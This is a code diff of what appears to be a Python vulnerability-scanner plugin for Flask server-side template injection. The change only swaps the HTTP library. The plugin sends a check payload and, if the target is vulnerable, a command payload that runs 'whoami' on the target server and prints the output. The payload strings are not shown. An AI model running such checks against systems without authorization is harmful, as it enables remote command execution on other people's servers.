@@ -5,9 +5,7 @@ name: Falsk SSTI漏洞
 description: Falsk SSTI注入漏洞,可执行任意命令
 '''
 
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class Ssti_BaseVerify:
     def __init__(self, url):
@@ -22,10 +20,10 @@ class Ssti_BaseVerify:
         try:
             if not self.url.startswith("http") and not self.url.startswith("https"):
                 self.url = "http://" + self.url
-            check_req = requests.get(self.url + self.check_payload, headers = self.headers, allow_redirects = False, verify = False)
+            check_req = request.get(self.url + self.check_payload, headers = self.headers)
             if check_req.text == 'Hello 54289' and check_req.status_code == 200:
                 print('存在Flask SSTI漏洞,执行whoami命令结果为:')
-                cmd_req = requests.get(self.url + self.cmd_payload, headers = self.headers, allow_redirects = False, verify = False)
+                cmd_req = request.get(self.url + self.cmd_payload, headers = self.headers)
                 print(cmd_req.text.replace('\n', ''))
                 return True
             else:
